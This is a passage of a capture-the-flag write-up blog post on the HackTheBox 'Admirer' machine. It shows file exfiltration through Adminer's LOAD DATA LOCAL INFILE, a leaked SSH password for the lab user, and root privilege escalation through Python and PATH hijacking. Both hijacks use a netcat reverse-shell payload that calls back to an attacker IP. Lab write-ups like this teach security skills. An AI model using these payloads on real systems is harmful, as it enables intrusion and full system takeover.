  <span class="k">load</span> <span class="k">data</span> <span class="k">local</span> <span class="n">infile</span> <span class="s1">'/etc/passwd'</span> <span class="k">into</span> <span class="k">table</span> <span class="n">mysql</span><span class="p">.</span><span class="n">exploit</span> <span class="n">fields</span> <span class="n">terminated</span> <span class="k">by</span> <span class="nv">"</span><span class="se">\n</span><span class="nv">"</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928043900.png" alt="" data-proofer-ignore></p><blockquote class="prompt-info"><div><ul><li>TheÂ <strong>open_basedir</strong>Â is a server configuration, a security measure to disallow file access.<li><code class="language-plaintext highlighter-rouge">/etc/passwd</code> is not in the configured path</ul></div></blockquote><li><code class="language-plaintext highlighter-rouge">/var/www/html/index.php</code><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  <span class="o">#</span> <span class="n">MySQL</span> <span class="n">Query</span>
  <span class="k">load</span> <span class="k">data</span> <span class="k">local</span> <span class="n">infile</span> <span class="s1">'/var/www/html/index.php'</span> <span class="k">into</span> <span class="k">table</span> <span class="n">mysql</span><span class="p">.</span><span class="n">exploit</span> <span class="n">fields</span> <span class="n">terminated</span> <span class="k">by</span> <span class="nv">"</span><span class="se">\n</span><span class="nv">"</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928044136.png" alt="" data-proofer-ignore></p><blockquote class="prompt-info"><div><ul><li>It worked!<li>This file is chosen because earlier, we saw that it contains credentials</ul></div></blockquote></ul><li>View exfiltrated file <code class="language-plaintext highlighter-rouge">index.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928044616.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</code></ul></ol><h2 id="tcp22-ssh">TCP/22 (SSH) <a href="#tcp22-ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Successfully SSH w/ <code class="language-plaintext highlighter-rouge">waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html]
 â””â”€# sshpass -p '&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;' ssh waldo@admirer.htb
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928045207.png" alt="" data-proofer-ignore></p></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---enumeration">Root - Enumeration <a href="#root---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check user <code class="language-plaintext highlighter-rouge">waldo</code> sudo access<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> waldo@admirer:~$ sudo -l
 [sudo] password for waldo:
 Matching Defaults entries for waldo on admirer:
     env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
	
 User waldo may run the following commands on admirer:
     (ALL) SETENV: /opt/scripts/admin_tasks.sh
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">SETENV</code> - Able to set <code class="language-plaintext highlighter-rouge">$PATH</code> environment, allowing us to do a PATH Hijacking exploit on executables/binaries that is called w/o their FULL PATH</p></div></blockquote><li>View <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre><td class="rouge-code"><pre> <span class="c">#!/bin/bash</span>
	
 view_uptime<span class="o">()</span>
 <span class="o">{</span>
     /usr/bin/uptime <span class="nt">-p</span>
 <span class="o">}</span>
	
 view_users<span class="o">()</span>
 <span class="o">{</span>
     /usr/bin/w
 <span class="o">}</span>
	
 view_crontab<span class="o">()</span>
 <span class="o">{</span>
     /usr/bin/crontab <span class="nt">-l</span>
 <span class="o">}</span>
	
 backup_passwd<span class="o">()</span>
 <span class="o">{</span>
     <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
     <span class="k">then
         </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
         /bin/cp /etc/passwd /var/backups/passwd.bak
         /bin/chown root:root /var/backups/passwd.bak
         /bin/chmod 600 /var/backups/passwd.bak
         <span class="nb">echo</span> <span class="s2">"Done."</span>
     <span class="k">else
         </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
     <span class="k">fi</span>
 <span class="o">}</span>
	
 backup_shadow<span class="o">()</span>
 <span class="o">{</span>
     <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
     <span class="k">then
         </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
         /bin/cp /etc/shadow /var/backups/shadow.bak
         /bin/chown root:shadow /var/backups/shadow.bak
         /bin/chmod 600 /var/backups/shadow.bak
         <span class="nb">echo</span> <span class="s2">"Done."</span>
     <span class="k">else
         </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
     <span class="k">fi</span>
 <span class="o">}</span>
	
 backup_web<span class="o">()</span>
 <span class="o">{</span>
     <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
     <span class="k">then
         </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
         /opt/scripts/backup.py &amp;
     <span class="k">else
         </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
     <span class="k">fi</span>
 <span class="o">}</span>
	
 backup_db<span class="o">()</span>
 <span class="o">{</span>
     <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
     <span class="k">then
         </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
         <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
         /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
     <span class="k">else
         </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
     <span class="k">fi</span>
 <span class="o">}</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>All of the binaries called are called w/ their FULL PATH, PATH Hijacking is not possible, except the function <code class="language-plaintext highlighter-rouge">backup_web()</code> where a python script is called.</p></div></blockquote><li>View <code class="language-plaintext highlighter-rouge">backup.py</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> waldo@admirer:~$ cat /opt/scripts/backup.py
 #!/usr/bin/python3
	
 from shutil import make_archive
	
 src = '/var/www/html/'
	
 # old ftp directory, not used anymore
 #dst = '/srv/ftp/html'
	
 dst = '/var/backups/html'
	
 make_archive(dst, 'gztar', src)
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Able to do Python PATH Hijacking</p></div></blockquote><li>What is Python Hijacking<ul><li>Python code in oneÂ <a href="https://docs.python.org/3/glossary.html#term-module">module</a>Â gains access to the code in another module by the process ofÂ <a href="https://docs.python.org/3/glossary.html#term-importing">importing</a>Â it.<li>If a module is imported, <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> is responsible for telling python where is that specific module by checking for the directories defined in <code class="language-plaintext highlighter-rouge">PYTHONPATH</code><li>Modules residing in the directory that the python script is executed supersedes/takes priority over the default python path.</ul></ol><h2 id="root---exploiting-admin_tasksh-w-setenv-python-path-hijacking">Root - Exploiting admin_task.sh w/ SETENV (Python Path Hijacking) <a href="#root---exploiting-admin_tasksh-w-setenv-python-path-hijacking" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>How do we exploit <code class="language-plaintext highlighter-rouge">admin_task.sh</code>?<ol><li>Since <code class="language-plaintext highlighter-rouge">backup_web()</code> is calling a python script (<code class="language-plaintext highlighter-rouge">backup.py</code>), we are able to do Python Path Hijacking.<li><code class="language-plaintext highlighter-rouge">backup.py</code> is importing <code class="language-plaintext highlighter-rouge">shutil.py</code>, specifically <code class="language-plaintext highlighter-rouge">make_archive</code> function<li>Create a malicious python script called <code class="language-plaintext highlighter-rouge">shutil.py</code> that has a function <code class="language-plaintext highlighter-rouge">make_archive()</code>, containing malicious code, in a writable directory (<code class="language-plaintext highlighter-rouge">/tmp</code>)<li>Execute <code class="language-plaintext highlighter-rouge">admin_task.sh</code> as <code class="language-plaintext highlighter-rouge">root</code> and set the python path to <code class="language-plaintext highlighter-rouge">/tmp</code><li>When <code class="language-plaintext highlighter-rouge">backup_web()</code> is called, <code class="language-plaintext highlighter-rouge">backup.py</code> will be executing our malicious python library.</ol><li>Exploiting <code class="language-plaintext highlighter-rouge">admin_task.sh</code> (Python Path Hijacking)<ol><li>View <code class="language-plaintext highlighter-rouge">make_archive</code> function in <code class="language-plaintext highlighter-rouge">shutil.py</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> waldo@admirer:/tmp$ cat /usr/lib/python3.5/shutil.py | grep -A1 "make_archive("
 def make_archive(base_name, format, root_dir=None, base_dir=None, verbose=0,
                  dry_run=0, owner=None, group=None, logger=None):
</pre></table></code></div></div><li>Create malicious python script <code class="language-plaintext highlighter-rouge">make_archive</code><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> <span class="kn">import</span> <span class="nn">os</span><span class="p">;</span>
 <span class="k">def</span> <span class="nf">make_archive</span><span class="p">(</span><span class="n">base_name</span><span class="p">,</span> <span class="nb">format</span><span class="p">,</span> <span class="n">root_dir</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">base_dir</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">dry_run</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">owner</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">group</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">logger</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
     <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"nc 10.10.14.14 4444 -e /bin/bash"</span><span class="p">)</span>
</pre></table></code></div></div><li>Start <code class="language-plaintext highlighter-rouge">netcat</code> listener<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer]
 â””â”€# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
</pre></table></code></div></div><li>Execute <code class="language-plaintext highlighter-rouge">admin_task.sh</code> as <code class="language-plaintext highlighter-rouge">root</code> and set python path to invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
</pre></table></code></div></div></ol><li>Demo - Exploiting <code class="language-plaintext highlighter-rouge">admin_task.sh</code> w/ <code class="language-plaintext highlighter-rouge">SETENV</code> (Python Path Hijacking) <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/qZlpNKIxvn.gif" alt="" data-proofer-ignore></ol><h1 id="additional">Additional</h1><h2 id="configure-admin_tasksh-to-do-regular-path-hijacking">Configure admin_task.sh to do regular Path Hijacking <a href="#configure-admin_tasksh-to-do-regular-path-hijacking" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Edit <code class="language-plaintext highlighter-rouge">admin_task.sh</code>, <code class="language-plaintext highlighter-rouge">view_uptime()</code> function<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> view_uptime()
 {
    uptime -p
 }
</pre></table></code></div></div><ul><li>Remove its full PATH</ul><li>Create malicious bash script named <code class="language-plaintext highlighter-rouge">uptime</code><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> <span class="c">#!/bin/bash</span>
	
 nc 10.10.14.14 4444 <span class="nt">-e</span> /bin/bash
</pre></table></code></div></div><li>Make it executable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> waldo@admirer:/tmp$ chmod +x uptime
</pre></table></code></div></div><li>Execute <code class="language-plaintext highlighter-rouge">admin_task.sh</code> as <code class="language-plaintext highlighter-rouge">root</code> and set path to invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo PATH=/tmp:$PATH /opt/scripts/admin_tasks.sh
</pre></table></code></div></div><li>Demo - Regular Path Hijacking w/ <code class="language-plaintext highlighter-rouge">SETENV</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/5XZw0FeGlk.gif" alt="" data-proofer-ignore></ol><h2 id="configure-php-so-that-adminer-is-able-to-load-any-file">Configure PHP so that Adminer is able to load any file <a href="#configure-php-so-that-adminer-is-able-to-load-any-file" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Earlier, we are restricted by <code class="language-plaintext highlighter-rouge">open_basedir</code> setting, it restricted us to only exfiltrating files in <code class="language-plaintext highlighter-rouge">/var/www/html</code><li>Remove <code class="language-plaintext highlighter-rouge">/var/www/html</code> from <code class="language-plaintext highlighter-rouge">open_basedir</code> setting so that we are able to exfiltrate any file<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> root@admirer:/var/www/html/utility-scripts# nano /etc/php/7.0/apache2/php.ini
 ...
 ; open_basedir, if set, limits all file operations to the defined directory
 ; and below.  This directive makes most sense if used in a per-directory
 ; or per-virtualhost web server configuration file.
 ; http://php.net/open-basedir
 open_basedir =
 ...
</pre></table></code></div></div><li>Restart <code class="language-plaintext highlighter-rouge">apache2</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> root@admirer:/var/www/html/utility-scripts# service apache2 restart
 Restarting Apache httpd web server: apache2.
</pre></table></code></div></div><li>Exfiltrate <code class="language-plaintext highlighter-rouge">/etc/passwd</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # MySQL Query
 load data local infile '/etc/passwd' into table mysql.exploit fields terminated by "\n"
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928155803.png" alt="" data-proofer-ignore></p><li>View exfiltrated file <code class="language-plaintext highlighter-rouge">/etc/passwd</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928155741.png" alt="" data-proofer-ignore><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928161156.png" alt="" data-proofer-ignore></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux-priv-esc-python-hijacking/" class="post-tag no-text-decoration" >linux-priv-esc/python-hijacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Admirer - Yufong&amp;u=https://yufongg.github.io/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FriendZone/"><div class="card-body"> <em class="timeago small" data-ts="1662825600" > 2022-09-11 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - FriendZone</h3><div class="text-muted small"><p> Overview This machine begins w/ a network enumeration w/ nmap, a domain name is enumerated friendzone.red, DNS enumeration w/ dig is carried out to enumerate subdomains. uploads.friendzone.red &amp;amp...</p></div></div></a></div><div class="card"> <a href="/posts/Symfonos-3/"><div class="card-body"> <em class="timeago small" data-ts="1643990400" > 2022-02-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Symfonos 3</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Fri Feb 4 03:37:59 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-3/192.168.110.12/sc...</p></div></div></a></div><div class="card"> <a href="/posts/Blunder/"><div class="card-body"> <em class="timeago small" data-ts="1672502400" > 2023-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering bludit CMS running, it is vulnerable to a bruteforce protection bypass, directory traversal + image upload exec vulnerability. With ce...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Magic/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Magic</p></a> <a href="/posts/Photobomb/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Photobomb</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Admirer/'; this.page.identifier = '/posts/Admirer/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> Â© 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> 